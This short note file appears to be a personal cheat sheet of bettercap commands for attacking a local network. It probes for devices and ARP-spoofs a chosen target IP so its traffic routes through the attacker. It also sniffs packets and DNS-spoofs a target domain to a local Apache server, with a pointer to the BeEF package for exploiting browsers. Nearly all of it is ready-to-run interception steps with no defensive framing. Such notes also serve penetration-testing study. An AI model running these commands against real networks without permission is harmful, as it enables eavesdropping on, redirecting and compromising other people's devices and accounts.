sudo bettercap
net.probe on

## see devices
net.show   // grab IP's

# ARP spoofing - route all traffic through you
## set target
set arp.spoof.targets <IP>
arp.spoof on
help arp.spoof

## sniff packets
net.sniff on

# DNS spoofing
set dns.spoof.domains <target domain>
## start an apach2 service and get it's IP
dns.spoof on
## use with the Beef package to exploit browser


# UI
# WARNING: replaces entire system caplet folder every time
## install
sudo bettercap -eval "caplets.update; ui.update; q"

## start
sudo bettercap -caplet http-ui


